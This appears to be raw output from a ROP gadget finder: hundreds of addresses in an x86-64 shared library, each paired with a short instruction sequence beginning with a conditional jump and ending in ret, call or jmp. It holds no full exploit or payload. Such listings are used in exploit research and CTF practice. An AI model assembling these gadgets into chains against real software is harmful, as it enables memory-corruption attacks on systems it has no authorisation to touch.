0x00002aaaaab62fe6 : jbe 0x8dff7 ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x00002aaaaab63873 : jbe 0x8e890 ; lea rdi, qword ptr [rdi + 0x10] ; jne 0x8e86b ; mov rax, rdi ; ret
0x00002aaaaab68933 : jbe 0x9394e ; lea rdi, qword ptr [rdi + 0x10] ; jne 0x93929 ; ret
0x00002aaaaab756f9 : jbe 0xa06f3 ; ret 0xf10
0x00002aaaaab77319 : jbe 0xa2313 ; ret 0xf10
0x00002aaaaab93502 : jbe 0xbe539 ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaabb0508 : jbe 0xdb517 ; mov eax, 0xc ; ret
0x00002aaaaabb053e : jbe 0xdb55b ; mov eax, 0xc ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabcacf8 : jbe 0xf5d03 ; ret
0x00002aaaaabcfe6b : jbe 0xfae8a ; cmp eax, 0xa1 ; je 0xfae92 ; neg eax ; pop rbx ; ret
0x00002aaaaabd39cb : jbe 0xfea00 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaabd39ff : jbe 0xfea35 ; add byte ptr [rax - 0x76b7ffc8], al ; ret
0x00002aaaaabd39fe : jbe 0xfea36 ; add byte ptr [rax - 0x76b7ffc8], al ; ret
0x00002aaaaabd58b8 : je 0x1008c9 ; mov dword ptr [rip + 0x2c2950], edi ; ret
0x00002aaaaabd6900 : je 0x10190b ; pop rbx ; ret
0x00002aaaaabd7e00 : je 0x102e12 ; add byte ptr [rax], al ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd7f3f : je 0x10348b ; xor esi, esi ; mov rdi, r12 ; call rbx
0x00002aaaaabd7a12 : je 0x1034ab ; xor esi, esi ; mov rdi, r12 ; call rbx
0x00002aaaaabd7cb5 : je 0x1034e3 ; xor esi, esi ; mov rdi, r13 ; call rbx
0x00002aaaaabd7f64 : je 0x103503 ; xor esi, esi ; mov rdi, r13 ; call rbx
0x00002aaaaabd7a37 : je 0x103523 ; xor esi, esi ; mov rdi, r13 ; call rbx
0x00002aaaaabd81e2 : je 0x103543 ; xor esi, esi ; mov rdi, r13 ; call rbx
0x00002aaaaabd7a5b : je 0x103563 ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd7dfe : je 0x103583 ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd7cd9 : je 0x1035a3 ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd7b80 : je 0x1035c3 ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd832b : je 0x1035e3 ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd8206 : je 0x103603 ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd80ad : je 0x103623 ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd7f88 : je 0x103643 ; xor esi, esi ; mov rdi, r14 ; call rbx
0x00002aaaaabd8021 : je 0x103663 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7fa8 : je 0x103683 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd83c4 : je 0x1036a3 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd834b : je 0x1036c3 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd829f : je 0x1036e3 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd8226 : je 0x103703 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd8146 : je 0x103723 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd80cd : je 0x103743 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7e97 : je 0x103763 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7e1e : je 0x103783 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7a7b : je 0x1037a3 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7d72 : je 0x1037c3 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7cf9 : je 0x1037e3 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7af4 : je 0x103803 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7c19 : je 0x103823 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd7ba0 : je 0x103843 ; xor esi, esi ; mov rdi, r15 ; call rbx
0x00002aaaaabd982e : je 0x1048ce ; call rax
0x00002aaaaabd99a5 : je 0x104aa6 ; call rax
0x00002aaaaabdb7f6 : je 0x1067fb ; ret
0x00002aaaaabdcc58 : je 0x107c68 ; mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x18 ; ret
0x00002aaaaabdd9c4 : je 0x1089cb ; pop rbp ; ret
0x00002aaaaabdddca : je 0x108dda ; add eax, 1 ; mov word ptr [rdx], ax ; ret
0x00002aaaaabde019 : je 0x109027 ; add eax, 1 ; mov dword ptr [rdx], eax ; ret
0x00002aaaaabe0dab : je 0x10bdc0 ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe0de5 : je 0x10be02 ; xor edx, edx ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe24b5 : je 0x10d4ca ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaabe3881 : je 0x10e8ac ; mov rdx, rax ; jmp 0x10e899
0x00002aaaaabe3b8c : je 0x10ebb0 ; mov rdx, r8 ; jmp 0x10eba0
0x00002aaaaabe6fa2 : je 0x111f82 ; mov rax, qword ptr [r12 + 0x38] ; jmp 0x111f76
0x00002aaaaabe7713 : je 0x112727 ; mov eax, 7 ; ret
0x00002aaaaabe7731 : je 0x112759 ; mov rdi, qword ptr [rdx + 0x50] ; mov rsi, rdx ; call rax
0x00002aaaaabe7740 : je 0x1127a4 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabe8e5b : je 0x113e6b ; ret
0x00002aaaaabe9509 : je 0x11450e ; ret
0x00002aaaaabe956d : je 0x114572 ; ret
0x00002aaaaabe998a : je 0x114992 ; ret
0x00002aaaaabe9c82 : je 0x114cb2 ; call rax
0x00002aaaaabea102 : je 0x11511f ; sub ecx, dword ptr [rax - 0x7d] ; ret
0x00002aaaaabea63d : je 0x115650 ; lea rax, qword ptr [rip - 0x767b6] ; ret
0x00002aaaaabea67e : je 0x115690 ; lea rax, qword ptr [rip + 0x37c19] ; ret
0x00002aaaaabea72d : je 0x115740 ; lea rax, qword ptr [rip - 0x76156] ; ret
0x00002aaaaabea76e : je 0x115780 ; lea rax, qword ptr [rip + 0x37ec9] ; ret
0x00002aaaaabea7b7 : je 0x1157c9 ; lea rax, qword ptr [rip - 0x6be60] ; ret
0x00002aaaaabeaca3 : je 0x115c9d ; dec dword ptr [rax - 0x7f] ; ret
0x00002aaaaabeb15c : je 0x116170 ; pop rbx ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaabeb2ae : je 0x1162ca ; add rsp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaabebaac : je 0x116abe ; add rsp, 8 ; ret
0x00002aaaaabec65c : je 0x117670 ; pop rbx ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaabec7ae : je 0x1177ca ; add rsp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaabf3eb7 : je 0x11eec3 ; mov rdi, rbx ; call rax
0x00002aaaaabf3eb7 : je 0x11eec7 ; mov rdi, rbx ; call rax
0x00002aaaaabf41af : je 0x11f1bb ; mov rdi, rbx ; call rax
0x00002aaaaabf42bf : je 0x11f2d3 ; lea rdi, qword ptr [rip + 0x2a83d8] ; call rax
0x00002aaaaabf436a : je 0x11f397 ; or byte ptr [rcx + rcx*4 - 0x11], cl ; call r12
0x00002aaaaabf7413 : je 0x12240b ; pop rbx ; ret
0x00002aaaaabfc752 : je 0x12775a ; ret
0x00002aaaaabfc7b1 : je 0x1277ba ; ret
0x00002aaaaabfc7ab : je 0x1277bb ; cmp dword ptr [rdi + 0x10], 2 ; je 0x1277c0 ; ret
0x00002aaaaabff453 : je 0x12a43d ; xor eax, eax ; pop rbx ; ret
0x00002aaaaabffc93 : je 0x12ac9f ; mov rdi, rsp ; call rax
0x00002aaaaabffd7e : je 0x12ad8a ; mov rdi, rsp ; call rax
0x00002aaaaac00439 : je 0x12b466 ; adc byte ptr [rax - 0x77], cl ; out dx, eax ; call r14
0x00002aaaaac00634 : je 0x12b640 ; mov rdi, rbp ; call rax
0x00002aaaaac009b8 : je 0x12b9c2 ; ret
0x00002aaaaac016c5 : je 0x12c6d1 ; mov rdi, r14 ; call rax
0x00002aaaaac01942 : je 0x12c7d4 ; mov rdi, qword ptr [rsp + 0x60] ; call rax
0x00002aaaaac01c43 : je 0x12cc54 ; xor eax, eax ; ret
0x00002aaaaac02252 : je 0x12d25e ; mov rdi, rbp ; call rdx
0x00002aaaaac02757 : je 0x12d854 ; mov rdi, rbp ; call qword ptr [rbx]
0x00002aaaaac066a2 : je 0x1316b6 ; lea rdi, qword ptr [rbx + 0xc8] ; call rax
0x00002aaaaac06996 : je 0x1319c7 ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; mov rcx, qword ptr [rsp + 0x20] ; call rcx
0x00002aaaaac06b8e : je 0x131bbf ; mov rdi, rbp ; mov rcx, qword ptr [rsp + 0x18] ; call rcx
0x00002aaaaac0705a : je 0x132066 ; mov rdi, r12 ; call rax
0x00002aaaaac0723b : je 0x132249 ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac07bd4 : je 0x132be4 ; xor eax, eax ; ret
0x00002aaaaac085db : je 0x1334ff ; mov rdi, rbp ; call rax
0x00002aaaaac08515 : je 0x133521 ; mov rdi, r13 ; call rax
0x00002aaaaac08623 : je 0x133637 ; mov eax, 1 ; ret
0x00002aaaaac0865f : je 0x133672 ; call 0x1f8ac
0x00002aaaaac08708 : je 0x133714 ; mov rdi, rbp ; call rax
0x00002aaaaac08928 : je 0x133934 ; mov rdi, rbp ; call rax
0x00002aaaaac0941f : je 0x13442d ; lea rdi, qword ptr [rbx + 0x68] ; call rax
0x00002aaaaac09665 : je 0x134696 ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; mov rcx, qword ptr [rsp + 0x20] ; call rcx
0x00002aaaaac0982e : je 0x13485f ; mov rdi, rbp ; mov rcx, qword ptr [rsp + 0x18] ; call rcx
0x00002aaaaac09acb : je 0x134ad7 ; mov rdi, r12 ; call rax
0x00002aaaaac09e3f : je 0x134e4d ; lea rdi, qword ptr [rbx + 0x58] ; call rax
0x00002aaaaac09fc6 : je 0x134ff7 ; xor byte ptr [rax - 0x77], cl ; out dx, eax ; mov rcx, qword ptr [rsp + 0x10] ; call rcx
0x00002aaaaac0c6ca : je 0x137658 ; mov qword ptr fs:[rbx], rax ; pop rbx ; ret
0x00002aaaaac0c64f : je 0x13765b ; pop rbx ; ret
0x00002aaaaac0c6f3 : je 0x137706 ; add rsp, 8 ; ret
0x00002aaaaac0c723 : je 0x13773a ; sub rax, -0x80 ; add rsp, 8 ; ret
0x00002aaaaac0cb01 : je 0x137b16 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac0d2db : je 0x1382e2 ; ret
0x00002aaaaac0d3bb : je 0x1383c9 ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac0dad4 : je 0x138ae2 ; lea rdi, qword ptr [rbp + 0x10] ; call rax
0x00002aaaaac0ee9f : je 0x139ecb ; cmp eax, 2 ; sete al ; movzx eax, al ; ret
0x00002aaaaac0ef4d : je 0x139fa8 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f00d : je 0x13a068 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f0cd : je 0x13a128 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f18d : je 0x13a1e8 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaac0f9fb : je 0x13aa27 ; or byte ptr [rcx + rcx*4 - 0x19], cl ; call qword ptr [rax]
0x00002aaaaac0fb3f : je 0x13ab6b ; or byte ptr [rcx + rcx*4 - 0x19], cl ; call qword ptr [rax]
0x00002aaaaac0fc8d : je 0x13acb8 ; or byte ptr [rax - 0x77], cl ; ret 0x4489
0x00002aaaaac0fd4d : je 0x13ad78 ; or byte ptr [rax - 0x77], cl ; ret 0x4489
0x00002aaaaac0fe0d : je 0x13ae38 ; or byte ptr [rax - 0x77], cl ; ret 0x4489
0x00002aaaaac0fecd : je 0x13aef8 ; or byte ptr [rax - 0x77], cl ; ret 0x4489
0x00002aaaaac101c1 : je 0x13b1d3 ; ret
0x00002aaaaac103a9 : je 0x13b3e2 ; add rsp, 0x10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac12188 : je 0x13d194 ; xor eax, eax ; ret
0x00002aaaaac16db1 : je 0x141dc6 ; add rsp, 8 ; ret
0x00002aaaaac19183 : je 0x14414d ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac19e55 : je 0x144e5d ; xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaac19f53 : je 0x144f1d ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac1ae3a : je 0x145e42 ; xchg eax, edx ; sub eax, edx ; ret
0x00002aaaaac1af93 : je 0x145f5d ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac1cb63 : je 0x147b2d ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac1ea55 : je 0x149a3b ; movsxd rax, ecx ; add rax, rdi ; sub rax, r8 ; ret
0x00002aaaaac1eb91 : je 0x149b78 ; movsxd rax, ecx ; add rax, rdi ; ret
0x00002aaaaac1ee83 : je 0x149e4d ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac20513 : je 0x14b4dd ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac33087 : je 0x15e097 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac332ca : je 0x15e2da ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac43bd7 : je 0x16ebe1 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaac48276 : je 0x17327c ; call rdx
0x00002aaaaac4838e : je 0x173399 ; call rax
0x00002aaaaac48385 : je 0x1733a7 ; mov rax, qword ptr [rdi + 0x20] ; test rax, rax ; je 0x1733a2 ; call rax
0x00002aaaaac48770 : je 0x173775 ; ret
0x00002aaaaac583a8 : je 0x183373 ; xor al, 0xd8 ; ret
0x00002aaaaac585e7 : je 0x1835e4 ; jmp 0x1835be
0x00002aaaaac590e2 : je 0x1840aa ; ret 0xacfc
0x00002aaaaac5b974 : je 0x1869d6 ; out dx, al ; lcall ptr [rcx + rbx*2 - 0x12] ; jmp qword ptr [rsi]
0x00002aaaaac5b970 : je 0x1869d6 ; out dx, al ; push qword ptr [rcx + rbx*2 - 0x12] ; lcall ptr [rcx + rbx*2 - 0x12] ; jmp qword ptr [rsi]
0x00002aaaaac5cb14 : je 0x187aa0 ; jmp rdx
0x00002aaaaac69355 : je 0x194354 ; jmp qword ptr [rax]
0x00002aaaaac69cd0 : je 0x194d30 ; cld ; jmp rsp
0x00002aaaaac6a404 : je 0x195481 ; cld ; jmp rsp
0x00002aaaaac6ab88 : je 0x195b54 ; call 0x71d899
0x00002aaaaac6b8e0 : je 0x196942 ; in eax, dx ; jmp rsp
0x00002aaaaac6ca29 : je 0x197a1e ; jmp rsp
0x00002aaaaac6cb80 : je 0x197bc8 ; call rsp
0x00002aaaaac6da09 : je 0x198a03 ; jmp rsp
0x00002aaaaac6da08 : je 0x198a04 ; jmp rsp
0x00002aaaaac6e508 : je 0x1994f3 ; idiv edi ; hlt ; ret 1
0x00002aaaaac6e780 : je 0x199794 ; clc ; jmp rsp
0x00002aaaaac6ef08 : je 0x199f66 ; stc ; push qword ptr [rdx + rcx + 0x52240002] ; stc ; call rsp
0x00002aaaaac6efa0 : je 0x19a00a ; stc ; call rsp
0x00002aaaaac6f0c8 : je 0x19a05b ; stc ; inc dword ptr [rsi + rdx - 0x78bbfffe] ; stc ; call rsp
0x00002aaaaac6f1e0 : je 0x19a1a6 ; stc ; call qword ptr [rdi + rbx + 2]
0x00002aaaaac6f478 : je 0x19a496 ; cli ; jmp rsp
0x00002aaaaac6f474 : je 0x19a4ae ; add al, byte ptr [rax] ; je 0x19a49a ; cli ; jmp rsp
0x00002aaaaac6f930 : je 0x19a8d5 ; cli ; call rsp
0x00002aaaaac6fa50 : je 0x19aa1c ; cli ; jmp qword ptr [rdi + rdx*2 + 2]
0x00002aaaaac75862 : je 0x1a0870 ; ret
0x00002aaaaac76cb0 : je 0x1a1cbd ; add byte ptr [rax], al ; jl 0x1a1d2e ; add byte ptr [rax], al ; cwde ; adc ebp, ebp ; call rsi
0x00002aaaaac77088 : je 0x1a2095 ; add byte ptr [rax], al ; push rsp ; jno 0x1a209a ; add byte ptr [rax], dh ; in eax, dx ; call rdx
0x00002aaaaac7a2ac : je 0x1a5258 ; add byte ptr [rax], al ; nop ; in al, -4 ; call qword ptr [rdx]
0x00002aaaaac7adac : je 0x1a5d63 ; add byte ptr [rax], al ; loopne 0x1a5d41 ; out dx, al ; jmp rbx
0x00002aaaaac7c1e0 : je 0x1a71e7 ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; ret 0
0x00002aaaaac7caac : je 0x1a7a80 ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac7ebb0 : je 0x1a9bbd ; add byte ptr [rax], al ; jl 0x1a9bad ; add byte ptr [rax], al ; or byte ptr [rbx], al ; call rdi
0x00002aaaaac822ac : je 0x1ad2d8 ; add dword ptr [rax], eax ; loopne 0x1ad253 ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac833ac : je 0x1ae3e9 ; add dword ptr [rax], eax ; push rax ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac84dac : je 0x1afe03 ; add dword ptr [rax], eax ; nop ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac850ac : je 0x1b0106 ; add dword ptr [rax], eax ; push rax ; jb 0x1b00af ; jmp qword ptr [rcx]
0x00002aaaaac85201 : je 0x1b01fa ; jmp qword ptr [rcx]
0x00002aaaaac857ac : je 0x1b080d ; add dword ptr [rax], eax ; jo 0x1b073e ; cmc ; jmp rax
0x00002aaaaac90521 : je 0x1bb51d ; call qword ptr [rdi]
0x00002aaaaaad6cba : je 0x1ce6 ; ret
0x00002aaaaaaf4b05 : je 0x1faa6 ; jmp 0x1facf
0x00002aaaaaaf6857 : je 0x21883 ; sbb byte ptr [rbp - 0x77], cl ; int1 ; call rbx
0x00002aaaaaaf9ff8 : je 0x25024 ; cmp byte ptr [rax + 0xf], cl ; ret 0x8949
0x00002aaaaaafab54 : je 0x25b83 ; mov rdi, qword ptr [rsp + 0x38] ; call r15
0x00002aaaaaafb864 : je 0x26892 ; mov rdi, qword ptr [rsp + 0x40] ; call rbx
0x00002aaaaaafd044 : je 0x28072 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x00002aaaaaafd2ab : je 0x282da ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00002aaaaaafdf14 : je 0x28f42 ; mov rdi, qword ptr [rsp + 0x38] ; call rbx
0x00002aaaaaafe183 : je 0x291b2 ; mov rdi, qword ptr [rsp + 0x38] ; call r14
0x00002aaaaaaff698 : je 0x2a6a3 ; pop rbx ; ret
0x00002aaaaaaff693 : je 0x2a6a8 ; cmp esi, 3 ; je 0x2a6a8 ; pop rbx ; ret
0x00002aaaaab00025 : je 0x2b02b ; call rax
0x00002aaaaab00396 : je 0x2b39c ; call rcx
0x00002aaaaab0137b : je 0x2c381 ; call rax
0x00002aaaaab081ae : je 0x331d9 ; adc byte ptr [rcx - 0x77], cl ; ret 0x1274
0x00002aaaaab084fe : je 0x3352d ; sub byte ptr [rcx - 0x17c7dbbc], cl ; xchg eax, esi ; ret
0x00002aaaaab09c5d : je 0x34c4c ; ret
0x00002aaaaab09c47 : je 0x34c63 ; and eax, 0x80000000 ; movd xmm0, eax ; ret
0x00002aaaaab09f55 : je 0x34f7f ; call 0xffffffffe28511e9
0x00002aaaaab0a046 : je 0x34fef ; ret
0x00002aaaaab0b94e : je 0x3696b ; add rsp, 0x98 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0bab0 : je 0x36acb ; add rsp, 0x98 ; pop rbx ; pop rbp ; ret
0x00002aaaaab0d380 : je 0x383ad ; sbb byte ptr [rcx + rcx*4 - 0x19], cl ; call r15
0x00002aaaaab0f6c4 : je 0x3a70a ; xor eax, eax ; cmp byte ptr [rdi], 0 ; jne 0x3a6da ; pop rbx ; ret
0x00002aaaaab0f79e : je 0x3a80b ; mov dword ptr [rdi], 0 ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab104f7 : je 0x3b519 ; add byte ptr [rdi], cl ; test dword ptr [rbx], esi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab109c7 : je 0x3b9e9 ; add byte ptr [rdi], cl ; test dword ptr [rdx], eax ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x00002aaaaab1aa20 : je 0x45a4a ; mov eax, ecx ; shl eax, 0x1e ; or eax, edx ; ret
0x00002aaaaab1aa1f : je 0x45a4b ; mov eax, ecx ; shl eax, 0x1e ; or eax, edx ; ret
0x00002aaaaab37913 : je 0x628a0 ; ret 0x348
0x00002aaaaab3fc46 : je 0x6ac68 ; add rsp, 0x28 ; pop rbx ; pop rbp ; ret
0x00002aaaaab4045a : je 0x6b463 ; ret
0x00002aaaaab4282e : je 0x6d83d ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab42a0d : je 0x6d9ab ; add rsp, 8 ; mov eax, esi ; pop rbx ; pop rbp ; ret
0x00002aaaaab42b93 : je 0x6dbd1 ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab42d97 : je 0x6ddb1 ; mov rdi, qword ptr [rdi + 0xe0] ; jmp rax
0x00002aaaaab42e33 : je 0x6de4b ; mov rax, qword ptr [rsp + 8] ; add rsp, 0x18 ; ret
0x00002aaaaab42e24 : je 0x6de54 ; or byte ptr [rax - 0x75], cl ; mov edi, 0xe0 ; call rax
0x00002aaaaab42e67 : je 0x6de81 ; mov rdi, qword ptr [rdi + 0xe0] ; jmp rax
0x00002aaaaab430d8 : je 0x6e102 ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab433b9 : je 0x6e3d2 ; add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab43535 : je 0x6e5fa ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaab43e75 : je 0x6ee91 ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44778 : je 0x6f7a3 ; mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab44dc3 : je 0x6fdd6 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab45107 : je 0x70115 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab45335 : je 0x70357 ; add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab454f7 : je 0x70505 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45679 : je 0x70685 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab45833 : je 0x70874 ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab45a76 : je 0x70a88 ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaab45f02 : je 0x70f1a ; add rsp, 8 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x00002aaaaab45fed : je 0x70ffe ; mov eax, r8d ; pop rbx ; ret
0x00002aaaaab46190 : je 0x711a5 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab46327 : je 0x71335 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab46cc6 : je 0x71d16 ; add esp, 0x20 ; pop rbx ; ret
0x00002aaaaab46cc5 : je 0x71d17 ; add esp, 0x20 ; pop rbx ; ret
0x00002aaaaab47aac : je 0x72ab2 ; ret
0x00002aaaaab47ada : je 0x72b3c ; pop rbp ; pop r12 ; ret
0x00002aaaaab47b7f : je 0x72be1 ; pop rbp ; pop r12 ; ret
0x00002aaaaab47cbd : je 0x72cc8 ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab47d01 : je 0x72d0c ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab47d57 : je 0x72d72 ; cmp rsi, rcx ; jb 0x72d5a ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab48238 : je 0x73247 ; mov eax, 0xffffffff ; ret
0x00002aaaaab499b0 : je 0x74974 ; add rsp, 8 ; mov eax, ebp ; pop rbx ; pop rbp ; ret
0x00002aaaaab49b4c : je 0x74b6b ; pop rbx ; mov eax, 0xffffffff ; pop rbp ; pop r12 ; ret
0x00002aaaaab4a50d : je 0x755d3 ; mov edx, eax ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4aad6 : je 0x75af2 ; mov eax, dword ptr [rdi + 0x70] ; test eax, eax ; js 0x75af2 ; ret
0x00002aaaaab4ab85 : je 0x75b95 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4af8a : je 0x75f95 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4b0ae : je 0x760bd ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b1f0 : je 0x76205 ; mov eax, esi ; pop rbx ; ret
0x00002aaaaab4b4d5 : je 0x764e5 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4be7a : je 0x76e85 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4bfb5 : je 0x7707a ; mov rax, rdx ; pop rbx ; ret
0x00002aaaaab4c4fb : je 0x7750d ; mov dword ptr [rdi], edx ; ret
0x00002aaaaab4c81c : je 0x7782f ; mov eax, 0xffffffff ; ret
0x00002aaaaab4c818 : je 0x7784b ; test edx, edx ; je 0x77833 ; mov eax, 0xffffffff ; ret
0x00002aaaaab4cb9c : je 0x77baf ; mov eax, 0xffffffff ; ret
0x00002aaaaab4cb98 : je 0x77bcb ; test edx, edx ; je 0x77bb3 ; mov eax, 0xffffffff ; ret
0x00002aaaaab4d086 : je 0x78095 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab4d187 : je 0x781a3 ; xor edx, edx ; div rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab4d303 : je 0x782e1 ; pop rbx ; mov eax, 0xffffffff ; pop rbp ; pop r12 ; ret
0x00002aaaaab4d41b : je 0x783c1 ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab4d48f : je 0x7849b ; pop rbx ; ret
0x00002aaaaab4f78a : je 0x7a812 ; movzx eax, bpl ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab502b3 : je 0x7b26d ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab50403 : je 0x7b3bd ; mov eax, 0xffffffff ; pop rbx ; ret
0x00002aaaaab50565 : je 0x7b572 ; ret
0x00002aaaaab50597 : je 0x7b5a6 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab50f7a : je 0x7bf85 ; and dword ptr [rbx], 0xffffffef ; pop rbx ; ret
0x00002aaaaab51007 : je 0x7c022 ; cmp rsi, rcx ; jne 0x7c00a ; lea eax, dword ptr [rdx + rdi] ; ret
0x00002aaaaab529bd : je 0x7dbdf ; mov rdx, rax ; jmp 0x7d9e8
0x00002aaaaab52f86 : je 0x7df97 ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab53074 : je 0x7e07a ; call rax
0x00002aaaaab53c17 : je 0x7ec24 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab58a32 : je 0x83a5b ; call rax
0x00002aaaaab59402 : je 0x8442e ; sub byte ptr [rax - 0x77], cl ; out dx, eax ; call rax
0x00002aaaaab599bb : je 0x849c1 ; call rax
0x00002aaaaab5ba59 : je 0x86a62 ; ret
0x00002aaaaab5bcf2 : je 0x86d07 ; mov eax, 0x16 ; ret
0x00002aaaaab5be1e : je 0x86fa9 ; mov rsi, r14 ; call rax
0x00002aaaaab5c968 : je 0x87983 ; xor ebx, ebx ; add rsp, 0x10 ; mov eax, ebx ; pop rbx ; ret
0x00002aaaaab5d378 : je 0x88382 ; ret
0x00002aaaaab5dcfb : je 0x88d0d ; lea rax, qword ptr [rip + 0x1777c] ; ret
0x00002aaaaab5dee8 : je 0x88efa ; lea rax, qword ptr [rip + 0xe6dbf] ; ret
0x00002aaaaab5f5db : je 0x8a5ed ; lea rax, qword ptr [rip + 0xda44c] ; ret
0x00002aaaaab5f6e8 : je 0x8a6fa ; lea rax, qword ptr [rip + 0xbf30f] ; ret
0x00002aaaaab5f865 : je 0x8a88c ; movsx eax, dl ; ret
0x00002aaaaab5f865 : je 0x8a88d ; movsx eax, dl ; ret
